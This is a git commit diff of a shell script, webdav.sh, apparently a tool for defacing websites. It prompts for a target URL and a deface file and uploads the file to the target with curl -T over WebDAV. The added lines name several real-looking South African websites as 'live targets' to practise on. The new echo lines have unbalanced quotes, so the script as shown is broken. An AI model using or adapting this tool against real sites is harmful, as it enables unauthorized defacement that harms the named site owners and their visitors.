7731c71b827318095744795c04eacc706f0e0f44
/Hanz_Solo <64393586+HanzSolo404@users.noreply.github.com>
2020-04-28 06:24:09 +0700

    Update webdav.sh

--- webdav.sh
+++ webdav.sh
@@ -1,10 +1,11 @@
 clear
+echo  "==========================================================
 cowsay -f eyes 'WEBDAV
-# CopyBy  : Hanz_Solo
-# TEAM    : No Team
-# CONTACT : HanzSolo404@GMAIL.COM' | lolcat
-
-
+echo  "# CopyBy  : Hanz_Solo
+echo  "# TEAM    : No Team
+echo  "# CONTACT : HanzSolo404@GMAIL.COM' | lolcat
+echo  "==========================================================
+echo  "${y} [Live Target Pembelajaran : http://jbkdesigns.co.za/ http://khumbulalodge.co.za/ http://jewishleaders.co.za/ http://ispor.co.za/ http://cgdesign.co.za/ htp://jwishleaders.co.za/ 
 read -p " Website Target ==> " target
 read -p " Nama sript Defacenya ==> " sc;
 curl -T /storage/emulated/0/$sc $target
